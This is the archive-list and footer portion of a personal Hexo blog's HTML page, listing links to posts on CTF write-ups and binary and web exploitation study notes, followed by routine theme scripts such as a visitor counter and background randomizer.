href="/2021/10/20/xman%E7%9A%84leve5%E5%8F%A6%E4%B8%80%E7%A7%8D%E8%A7%A3%E6%B3%95(mprotect)%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%A9%E7%94%A8/">xman的leve5另一种解法(mprotect)学习与利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/21/ctfshow-%E6%9C%88%E9%A5%BC%E6%9D%AF-pwn-wp/">ctfshow-月饼杯2021-pwn-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/16/'could%20not%20patch%20the%20PLT%20stub;%20unexpected%20PLT%20format%20or%20the%20file%20has%20been%20modified%20after%20linking!'%E6%8A%A5%E9%94%99%E7%BC%93%E8%A7%A3%E6%96%B9%E6%B3%95/">\`could not patch the PLT stub; unexpected PLT format or the file has been modified after linking!\`报错缓解方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/03/5%E7%A7%8D%E5%AD%97%E7%AC%A6%E6%9E%84%E9%80%A0php_shellcode/">5种字符'(^.9)'构造php_shellcode</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/08/17/ractf2021-pwn-ctf/">ractf2021-pwn-ctf</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/07/28/imaginaryctf2021--pwn-wp/">imaginaryctf2021-pwn-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/07/12/%E9%AB%98%E7%89%88%E6%9C%AClibc(2.29-2.32)%20off%20by%20null%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/">高版本libc(2.29-2.32) off by null利用姿势笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/06/26/2021qwb%20pwn%20wp/">2021qwb-pwn-初赛-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/28/ISCC2021%20PWN%20WP/">ISCC2021 PWN部分 WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/22/ret2dl-resolve%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%B0%8F%E8%AE%B0/">ret2dl-resolve利用方法小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/20/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%8ESROP%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">系统调用与SROP方法学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/05/02/heap%E6%B3%84%E9%9C%B2%E7%9C%9F%E5%AE%9E%E5%9C%B0%E5%9D%80tirck/">pwn堆题泄露libc真实地址小tirck</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/28/CTF%202021%20PWN%20babyheap%20%20%E5%A4%8D%E7%8E%B0%E8%AE%B0/">2021*CTF_PWN_babyheap复现记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/25/%E5%85%B3%E4%BA%8E%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(9)/">关于格式化字符串利用——学pwn小记(9)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/17/Tcache%20attack%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(8)/">Tcache attack初学习——学pwn小记(8)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/09/%E4%BB%8E%E5%AF%B9b00k%E9%A2%98%E7%9B%AEwp%E5%AD%A6%E4%B9%A0%E5%88%9D%E4%B9%A0off-by-one%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(7)/">从对b00k题目学习中初习off-by-one——学pwn小记(7)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/04/08/actf--wp/">ångstromCTF 2021--wp与复现记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/25/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6libc%E4%B8%BA%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC/">修改ELF文件libc为指定版本</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/14/%E5%8A%AB%E6%8C%81hook%E5%87%BD%E6%95%B0%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(6)/">劫持hook函数——学pwn小记(6)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/11/fastbin%E4%BA%8C%E6%AC%A1%E9%87%8A%E6%94%BE%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(5)/">fastbin二次释放——学pwn小记(5)</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/15/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018-Comment%20%20%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/">网鼎杯 2018-Comment  复现笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/31/%E5%85%B3%E4%BA%8Esql%E6%B3%A8%E5%85%A5bypass%E6%80%BB%E7%BB%93/">关于sql注入bypass总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/08/%E5%AE%89%E6%B4%B5%E6%9D%AF2019%E5%A4%8D%E7%8E%B0/">安洵杯2019复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/07/xman%20pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/">xman pwn题复现——学pwn小记（4）</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/31/flask.request%E7%9A%84%E5%86%85%E7%BD%AE%E5%B1%9E%E6%80%A7%E6%80%BB%E7%BB%93/">flask.request的内置属性总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/30/%E5%AF%B9php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%BD%92%E7%BA%B3/">对php伪协议的归纳</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/21/HWCTF-%E5%8D%8E%E4%B8%BA%E4%BA%91%E5%9C%BAWP/">HWCTF-华为云场WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/16/linux%20%E5%86%85%E7%BD%AE%E5%8F%82%E6%95%B0%E6%95%B4%E7%90%86/">linux 内置参数整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/27/%E5%85%B3%E4%BA%8Ejinja%E7%89%B9%E6%80%A7%E5%AF%B9ssti%E7%9A%84bypass%E7%9A%84%E5%BD%B1%E5%93%8D/">关于jinja2特性对ssti的bypass的影响</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/16/%E5%85%B3%E4%BA%8Ephp%E6%89%A7%E8%A1%8C%E4%B8%8E%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0%E6%95%B4%E7%90%86/">php执行与文件系统处理函数整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/15/%E7%AC%AC%E4%BA%94%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-wp/">第五届上海市大学生网络安全大赛-初赛wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/12/ctf-show_%E5%8E%9F%E8%B0%85%E6%9D%AFwp/">ctf-show_原谅杯wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/26/ctf-show%201024%E6%9D%AF/">ctf-show 1024杯</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/15/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(3)/">Linux_x64下的ret2bilc与ret2csu--学习pwn小记(3)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/14/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9Bwp/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9Bwp/">第十三届全国大学生信息安全竞赛-创新实践能力赛西南赛区选拔赛wp/第十三届全国大学生信息安全竞赛-创新实践能力赛西南赛区选拔赛wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/22/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9Bwp/">第十三届全国大学生信息安全竞赛-创新实践能力赛西南赛区选拔赛wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/13/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(2)/">学习pwn小记(2)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/10/%E5%AF%B9linux%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%80%BB%E7%BB%93/">对linux 命令执行的总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/09/%E5%AD%A6%E4%B9%A0pwn%E5%B0%8F%E8%AE%B0(1)/">学习pwn小记(1)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/12/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">关于SQL注入小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/26/%E5%AE%89%E6%81%92DASCTF%207%E6%9C%88%E8%B5%9BWP/">安恒DASCTF 7月赛WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/15/rgbCTF--wp/">sctf2020 pythonbox题目复现小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/18/NahamCon%20CTF%20WP/">NahamCon CTF WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/31/%E5%AF%B9%E4%BA%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/">对于文件包含漏洞的知识梳理</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/26/%E5%85%B3%E4%BA%8Ephp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/">关于php反序列化字符逃逸的思考</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/23/%E5%A6%82%E4%BD%95%E8%AE%A9%E6%96%87%E4%BB%B6%E9%87%8CPHP%E4%BB%A3%E7%A0%81%E8%A2%AB%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%89%A7%E8%A1%8C/">如何让文件里PHP代码被服务器解析执行</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/21/%E8%99%8E%E7%AC%A6CTF2020--EasyLogin%20%20%20Write%20%20up/">虎符CTF2020--EasyLogin WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/27/python%20%E5%85%B3%E4%BA%8E%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/">关于python ssti的思考</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/">关于updatexml()报错注入的思考</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/10/cocos2d%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E6%B1%89%E5%8C%96--Writing%20a%20cocos2d%20application/">cocos2d官方文档汉化--Writing a cocos2d application</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/03/hello-world/">Hello World</a></li></ul>




    <script>
        
    </script>


</div>




  
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
        	                <span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
<script>
    var now = new Date(); 
    function createtime() { 
        var grt= new Date("01/03/2019 12:39:00");//此处修改你的建站时间或者网站上线时间 
        now.setTime(now.getTime()+250); 
        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "; 
        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
    } 
setInterval("createtime()",250);
</script>
            <div class="footer-left">
                <i class="fa fa-copyright"></i> 
                2019-2025 lexsd6
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
            </div>
        </div>

    <div class="visit">
        
            <span id="busuanzi_container_site_pv" style='display:inline'>
                <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
                </span>
            </span>
        
        
            <span>| </span>
        
        
            <span id="busuanzi_container_page_pv" style='display:inline'>
                <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
                </span>
            </span>
        
    </div>

    </div>
</footer>
    </div>
    
<script data-main="/js/main.js" src="//lexsd6.github.io/js/require.min.js"></script>

    <script>
        $(document).ready(function() {
            var iPad = window.navigator.userAgent.indexOf('iPad');
            if (iPad > -1 || $(".left-col").css("display") === "none") {
                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
            }
            else {
                var backgroundnum = 20;
                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
            }
        })
    </script>





<div class="scroll" id="scroll">
    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    // Open in New Window
    
        var oOpenInNew = {
            
            
            
            
            
            
             archives: ".archive-article-title", 
             miniArchives: "a.post-list-link", 
            
             friends: "#js-friends a", 
             socail: ".social a" 
        }
        for (var x in oOpenInNew) {
            $(oOpenInNew[x]).attr("target", "_blank");
        }
    
</script>

    <script>
        var originTitle = document.title;
        var titleTime;
        document.addEventListener("visibilitychange", function() {
            if (document.hidden) {
                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
                clearTimeout(titleTime);
            }
            else {
                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
                titleTime = setTimeout(function() {
                    document.title = originTitle;
                }, 2000);
            }
        })
    </script>

<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>


  </div>


</body>
</html>